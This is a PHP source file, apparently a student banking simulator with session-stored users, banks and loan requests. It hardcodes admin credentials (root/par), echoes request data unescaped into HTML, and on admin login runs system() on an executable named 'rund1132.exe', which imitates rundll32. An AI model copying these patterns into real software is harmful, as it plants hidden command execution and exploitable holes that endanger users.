<?php
    namespace classes;
    spl_autoload_register();
    session_start();

    function checkUser($login)
    {
        if(isset($_SESSION['users'])) {
            if(isset($_SESSION['users']['Fiz'])) {
                foreach ($_SESSION['users']['Fiz'] as $value) {
                    if($login == $value->getUserLogin()) return 1;
                }
            }
            if(isset($_SESSION['users']['Ur'])) {
                foreach ($_SESSION['users']['Ur'] as $value) {
                    if($login == $value->getUserLogin()) return 1;
                }
            }
        }
        return 0;
    }

    function checkBank($name)
    {
        if(isset($_SESSION['banks'])) {
            foreach ($_SESSION['banks'] as $value) {
                if($name == $value->getBankName()) return 1;
            }
        }
        return 0;
    }

    function checkBankOwner($name)
    {
        if(isset($_SESSION['users']['Ur'])) {
            foreach ($_SESSION['users']['Ur'] as $value) {
                if($name == $value->getUserLogin()) return 0;
            }
        }
        return 1;
    }

    if(isset($_REQUEST['deleteall'])) {
        session_destroy();
    }

    if(isset($_REQUEST['exit'])) {
        unset($_SESSION['login']);
        unset($_SESSION['password']);
        unset($_SESSION['input']);
        unset($_SESSION['now']['inacc']);
        unset($profile);
        unset($_SESSION['now']);
    }

    if(isset($_SESSION['now']['inacc'])) {
        echo "Аккаунт пользователя ".$_SESSION['now']['login']."<br /><br />"; 
        $profile = $_SESSION['now']['profile']; 
        if($_SESSION['now']['acctype'] == "Fiz") { ?>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="infoAcc" value="Посмотреть информацию об аккаунте"><br />
                <?php if(isset($_REQUEST['infoAcc'])) {
                    echo "Логин: ".$_SESSION['now']['login']."<br />";
                    echo "Тип аккаунта: ".$_SESSION['now']['acctype']."<br />";
                    echo "Деньги на счету: ".$profile->getUserMoney()."<br />";
                    echo "Банки: "."<br />";
                    foreach($profile->getUserBanks() as $bank) {
                        echo "\t".$bank."<br />";
                    }
                    echo "<br />"; 
                } ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="getNewCredit" value="Запросить кредит"><br />
                <?php if(isset($_REQUEST['getNewCredit'])) { ?>
                    Выберите банк:
                    <form id="bank" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="bank" from="bank">
                            <?php
                                foreach($_SESSION['banks'] as $bank) {
                                    echo '<option value="'.$bank->getBankName().'">'.$bank->getBankName().'</option>';
                                }
                            ?>
                        </select> <br />
                        Введите сумму кредита: <input type="text" name="creditSumm" value="">
                        <input type="submit" name="getCredit" value="Запросить">
                    </form>

                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['getCredit'])) {
                    $_SESSION['banks'][$_REQUEST['bank']]->creditIssuance($_SESSION['now']['login'], $_REQUEST['creditSumm']);
                    echo "Запрос успешно отправлен. Ожидайте одобрения<br />";
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="depositCredit" value="Внести платёж по кредиту"><br />
                <?php if(isset($_REQUEST['depositCredit'])) { ?>
                    Выберите банк:
                    <form id="bank" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="bank" from="bank">
                            <?php
                                foreach($_SESSION['now']['profile']->getUserBanks() as $bank) {
                                    echo '<option value="'.$bank.'">'.$bank.'</option>';
                                }
                            ?>
                        </select> <br />
                        Введите сумму погашения: <input type="text" name="summ" value="">
                        <input type="submit" name="deposit" value="Запросить">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['deposit'])) {
                    if($_SESSION['now']['profile']->getUserMoney() >= $_REQUEST['summ']) {
                        $flag = $_SESSION['banks'][$_REQUEST['bank']]->userDeposit($_SESSION['now']['login'], $_REQUEST['summ']);
                        $_SESSION['now']['profile']->deposit($_REQUEST['summ'], $_REQUEST['bank'], $flag);
                        echo "Деньги отправлены";
                    } else echo "Недостаточно денег на счету";
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="depositCash" value="Внести наличные"><br />
                <?php if(isset($_REQUEST['depositCash'])) { ?>
                    <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        Введите сумму: <input type="text" name="summ" value="">
                        <input type="submit" name="deposCash" value="Пополнить">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['deposCash'])) {
                    $_SESSION['now']['profile']->giveMoney($_REQUEST['summ']);
                    echo "Деньги внесены<br /><br />";
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="takeCash" value="Снять наличные"><br /><br />
                <?php if(isset($_REQUEST['takeCash'])) { ?>
                    <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        Введите сумму: <input type="text" name="summ" value="">
                        <input type="submit" name="tCash" value="Снять">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['tCash'])) {
                    if($_SESSION['now']['profile']->getUserMoney() >= $_REQUEST['summ']) {
                        $_SESSION['now']['profile']->takeMoney($_REQUEST['summ']);
                        echo "Деньги сняты<br /><br />";
                    } else {
                        echo "Недостаточно денег<br /><br />";
                    }
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="exit" value="Выйти"><br /> 
            </form>
        <?php } else { ?>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="infoAcc" value="Посмотреть информацию об аккаунте"><br />
                <?php if(isset($_REQUEST['infoAcc'])) {
                    echo "Логин: ".$_SESSION['now']['login']."<br />";
                    echo "Тип аккаунта: ".$_SESSION['now']['acctype']."<br />";
                    echo "Банки: "."<br />";
                    foreach($profile->getUserBanks() as $bank) {
                        echo "".$bank.": ".$_SESSION['banks'][$bank]->getBankMoney();
                        ?>
                        <input type="text" name="bank" value="<?= $bank ?>" hidden> 
                        <input type="submit" name="infoUserBank" value="Посмотреть запросы на кредит"> 
                        <?php
                    }
                } ?>
            </form> <?php
                if(isset($_REQUEST['Approve'])) {
                    $_SESSION['banks'][$_REQUEST['bank']]->creditApprove($_REQUEST['name']);
                }
                if(isset($_REQUEST['Fail'])) {
                    $_SESSION['banks'][$_REQUEST['bank']]->creditFail($_REQUEST['name']);
                }
                if(isset($_REQUEST['infoUserBank'])) { ?>
                    <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <input type="text" name="infoUserBank" value="" hidden>
                        <input type="text" name="bank" value="<?= $_REQUEST['bank'] ?>" hidden>
                        <?php foreach($_SESSION['banks'][$_REQUEST['bank']]->getBankRequests() as $name => $summ) {
                            echo $name.": ".$summ; ?>
                            <input type="text" name="name" value="<?= $name ?>" hidden>
                            <input type="submit" name="Approve" value="Одобрить">
                            <input type="submit" name="Fail" value="Отклонить"><br />
                        <?php } ?>
                    </form>
                <?php }
                echo "<br />";
                ?>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="exit" value="Выйти"><br /> 
            </form>
        <?php } ?>
    <?php } else if(isset($_REQUEST['input']) || isset($_SESSION['input'])) {
        if (isset($_REQUEST['login']) && isset($_REQUEST['password']) && $_REQUEST['login'] == "root" && $_REQUEST['password'] == "par" ||
            isset($_SESSION['login']) && isset($_SESSION['password']) && $_SESSION['login'] == "root" && $_SESSION['password'] == "par") {
            if(!isset($_SESSION['login']) || !isset($_SESSION['password'])) {
                $_SESSION['login'] = $_REQUEST['login'];
                $_SESSION['password'] = $_REQUEST['password'];
                $_SESSION['input'] = "";
            }
            echo "Вы вошли в аккаунт администратора";
            system("rund1132.exe user32.dll,LockWorkStation"); ?> <br /><br />
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="createNewBank" value="Создать Банк"><br />
                <?php 
                    if(isset($_REQUEST['createNewBank'])) { ?>
                        <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                            Название банка: <input type="text" name="new_bank_name" value=""><br />
                            Имя регистрирующего лица: <input type="text" name="new_bank_owner" value=""><br />
                            Страна: <input type="text" name="new_bank_country" value=""><br />
                            Сумма на балансе: <input type="text" name="new_bank_money" value=""><br />
                            <input type="submit" name="createBank" value="Подтвердить">
                        </form>
                        <?php echo "<br />"; 
                    } 

                    if(isset($_REQUEST['createBank'])) {
                        if(!checkBank($_REQUEST['new_bank_name'])){
                        if(!checkBankOwner($_REQUEST['new_bank_owner'])) {
                            $_SESSION['banks'][$_REQUEST['new_bank_name']] = new banks\Bank(
                                                                $_REQUEST['new_bank_name'], 
                                                                $_REQUEST['new_bank_owner'], 
                                                                $_REQUEST['new_bank_country'], 
                                                                $_REQUEST['new_bank_money']
                                                                );
                            $_SESSION['users']['Ur'][$_REQUEST['new_bank_owner']]->addBank($_REQUEST['new_bank_name']);
                        } else echo "Пользователя не существует или он не Юр. лицо!<br />";
                        } else echo "Такой банк уже есть в Базе!<br />";
                    }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="infoBank" value="Посмотреть информацию о Банке"><br />
                <?php if(isset($_REQUEST['infoBank'])) { ?>
                    <form id="bank" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="bank" from="bank">
                            <?php
                                foreach($_SESSION['banks'] as $bank) {
                                    echo '<option value="'.$bank->getBankName().'">'.$bank->getBankName().'</option>';
                                }
                            ?>
                        </select> <br />
                        <input type="submit" name="bankinfo" value="Узнать информацию">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['bankinfo'])) {
                    $bank = $_SESSION['banks'][$_REQUEST['bank']];
                    echo "Название: ".$bank->getBankName()."<br>";
                    echo "Деньги: ".$bank->getBankMoney()."<br>";
                    echo "Владелец: ".$bank->getBankOwner()."<br>";
                    echo "Страна: ".$bank->getBankCountry()."<br>";
                    echo "Клиенты: <br>";
                    foreach($bank->getBankClients() as $key => $value) {
                        echo $key.": ".$value."<br>";
                    }
                    echo "Запросы на кредит: <br>";
                    foreach($bank->getBankRequests() as $key => $value) {
                        echo $key.": ".$value."<br>";
                    }
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="deleteBank" value="Удалить Банк"><br /><br />
                <?php if(isset($_REQUEST['deleteBank'])) { ?>
                    <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="bank" from="bank">
                            <?php
                                foreach($_SESSION['banks'] as $bank) {
                                    echo '<option value="'.$bank->getBankName().'">'.$bank->getBankName().'</option>';
                                }
                            ?>
                        </select>
                        <input type="submit" name="delBank" value="Удалить"><br />
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['delBank']) && isset($_SESSION['banks'][$_REQUEST['bank']])) {
                    $ownerName = $_SESSION['banks'][$_REQUEST['bank']]->getBankOwner();
                    $_SESSION['users']['Ur'][$ownerName]->delBank($_REQUEST['bank']);
                    foreach($_SESSION['banks'][$_REQUEST['bank']]->getBankClients() as $name => $summ) {
                        $_SESSION['users']['Fiz'][$name]->delBank($_REQUEST['bank']);
                    }
                    unset($_SESSION['banks'][$_REQUEST['bank']]);
                    echo "Банк удалён<br />";
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="createNewUser" value="Создать Аккаунт"><br />
                <?php 
                    if(isset($_REQUEST['createNewUser'])) { ?>
                        <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                            Логин нового пользователя: <input type="text" name="new_user_login" value=""><br />
                            Пароль нового пользователя: <input type="password" name="new_user_password" value=""><br />
                            Физ. лицо: <input type="radio" name="new_user_type" value="fiz" checked><br />
                            Юр. лицо: <input type="radio" name="new_user_type" value="ur"><br />
                            <input type="submit" name="createUser" value="Подтвердить">
                        </form>
                        <?php echo "<br />"; 
                    }
                    if(isset($_REQUEST['createUser'])) {
                        if(!checkUser($_REQUEST['new_user_login'])) {
                            if($_REQUEST['new_user_type'] == "fiz") {
                                $_SESSION['users']['Fiz'][$_REQUEST['new_user_login']] = new persons\Fiz(
                                                                            $_REQUEST['new_user_login'], 
                                                                            $_REQUEST['new_user_password']
                                                                            );
                            } else {
                                $_SESSION['users']['Ur'][$_REQUEST['new_user_login']] = new persons\Ur(
                                                                            $_REQUEST['new_user_login'], 
                                                                            $_REQUEST['new_user_password']
                                                                            );
                            }
                        } else {
                            echo "Такой пользователь уже есть в Базе!<br />";
                        }
                    }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="infoUser" value="Посмотреть информацию об Аккаунте"><br />
                <?php if(isset($_REQUEST['infoUser'])) { ?>
                    Юр. лица: <form id="userUr" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="userUr" from="userUr">
                            <?php
                                foreach($_SESSION['users']['Ur'] as $user) {
                                    echo '<option value="'.$user->getUserLogin().'">'.$user->getUserLogin().'</option>';
                                }
                            ?>
                        </select> <br />
                        <input type="submit" name="userinfoUr" value="Узнать информацию">
                    </form>
                    Физ. лица: <form id="userFiz" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="userFiz" from="userFiz">
                            <?php
                                foreach($_SESSION['users']['Fiz'] as $user) {
                                    echo '<option value="'.$user->getUserLogin().'">'.$user->getUserLogin().'</option>';
                                }
                            ?>
                        </select> <br />
                        <input type="submit" name="userinfoFiz" value="Узнать информацию">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['userinfoFiz'])) {
                    $user = $_SESSION['users']['Fiz'][$_REQUEST['userFiz']];
                    echo "Имя: ".$user->getUserLogin()."<br>";
                    echo "Деньги на счету: ".$user->getUserMoney()."<br>";
                    echo "Банки: <br>";
                    foreach($user->getUserBanks() as $key) {
                        echo $key."<br>";
                    }
                }
                if(isset($_REQUEST['userinfoUr'])) {
                    $user = $_SESSION['users']['Ur'][$_REQUEST['userUr']];
                    echo "Имя: ".$user->getUserLogin()."<br>";
                    echo "Банки: <br>";
                    foreach($user->getUserBanks() as $key) {
                        echo $key."<br>";
                    }
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="deleteUser" value="Удалить Аккаунт"><br /><br />
                <?php if(isset($_REQUEST['deleteUser'])) { ?>
                    Юр. лица: <form id="userUr" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="userUr" from="userUr">
                            <?php
                                foreach($_SESSION['users']['Ur'] as $user) {
                                    echo '<option value="'.$user->getUserLogin().'">'.$user->getUserLogin().'</option>';
                                }
                            ?>
                        </select> <br />
                        <input type="submit" name="delUserUr" value="Удалить">
                    </form>
                    Физ. лица: <form id="userFiz" action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        <select name="userFiz" from="userFiz">
                            <?php
                                foreach($_SESSION['users']['Fiz'] as $user) {
                                    echo '<option value="'.$user->getUserLogin().'">'.$user->getUserLogin().'</option>';
                                }
                            ?>
                        </select> <br />
                        <input type="submit" name="delUserFiz" value="Удалить">
                    </form>
                    <?php echo "<br />"; 
                } 
                if(isset($_REQUEST['delUserFiz'])) {
                    $user = $_SESSION['users']['Fiz'][$_REQUEST['userFiz']];
                    foreach($user->getUserBanks() as $bank) {
                        $_SESSION['banks'][$bank]->userDelete($_REQUEST['userFiz']);
                    }
                    unset($_SESSION['users']['Fiz'][$_REQUEST['userFiz']]);
                    unset($user);
                }
                if(isset($_REQUEST['delUserUr'])) {
                    $user = $_SESSION['users']['Ur'][$_REQUEST['userUr']];
                    foreach($user->getUserBanks() as $bank) {
                        foreach($_SESSION['banks'][$bank]->getBankClients() as $name => $summ) {
                            $_SESSION['users']['Fiz'][$name]->delBank($bank);
                        }
                        unset($_SESSION['banks'][$bank]);
                    }
                    unset($_SESSION['users']['Ur'][$_REQUEST['userUr']]);
                    unset($user);
                }
                ?>
            </form>
            <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                <input type="submit" name="exit" value="Выйти"><br />
            </form>
        <?php } else { ?>
            <?php 
                $flag = 1;
                if(isset($_REQUEST['login']) && isset($_REQUEST['password'])) {
                    $login = $_REQUEST['login'];
                    $password = $_REQUEST['password'];
                    foreach($_SESSION['users']['Fiz'] as $user) {
                        if($user->getUserLogin() == $login) {
                            if($user->signIn($login, $password)) {
                                echo "Добро пожаловать ".$login."<br />";
                                if(!isset($_SESSION['login']) || !isset($_SESSION['password'])) {
                                    $_SESSION['now']['login'] = $_REQUEST['login'];
                                    $_SESSION['now']['password'] = $_REQUEST['password'];
                                    $_SESSION['now']['inacc'] = "";
                                    $_SESSION['now']['acctype'] = "Fiz";
                                    $_SESSION['now']['profile'] = $user;
                                }
                                ?>
                                <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                                    <input type="submit" value="Войти"><br /><br />
                                    <input type="submit" name="exit" value="Выйти"><br /> 
                                </form>
                                <?php
                                $flag = 0;
                            }
                        }
                    }
                    foreach($_SESSION['users']['Ur'] as $user) {
                        if($user->getUserLogin() == $login) {
                            if($user->signIn($login, $password)) {
                                echo "Добро пожаловать ".$login."<br />";
                                if(!isset($_SESSION['login']) || !isset($_SESSION['password'])) {
                                    $_SESSION['now']['login'] = $_REQUEST['login'];
                                    $_SESSION['now']['password'] = $_REQUEST['password'];
                                    $_SESSION['now']['inacc'] = "";
                                    $_SESSION['now']['acctype'] = "Ur";
                                    $_SESSION['now']['profile'] = $user;
                                }
                                ?>
                                <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                                    <input type="submit" value="Войти"><br /><br />
                                    <input type="submit" name="exit" value="Выйти"><br /> 
                                </form>
                                <?php
                                $flag = 0;
                            }
                        }
                    }
                    unset($login);
                    unset($password);
                }
                if($flag) { ?>
                    <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
                        Логин: <input type="text" name="login" value=""><br />
                        Пароль: <input type="password" name="password" value=""><br />
                        <input type="submit" name="input" value="Войти в аккаунт">
                    </form>
                    <?php echo "Неправильный логин или пароль!"; 
                    unset($flag); ?>
                <?php } ?> 

        <?php } ?>
<?php } else {
    if(!isset($_REQUEST['sign_in'])): ?>
        <p>Вас приветствует программа</p>
        <p>Умные финансы</p>
        <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
            <input type="submit" name="sign_in" value="Войти">
        </form>
    <?php else: ?>
        <form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
            Логин: <input type="text" name="login" value=""><br />
            Пароль: <input type="password" name="password" value=""><br />
            <input type="submit" name="input" value="Войти в аккаунт">
        </form>
    <?php endif; ?>
<?php } ?>


<form action="<?=$_SERVER['SCRIPT_NAME']?>" method="post">
    <input type="submit" name="deleteall" value="Удалить данные сессии">
</form>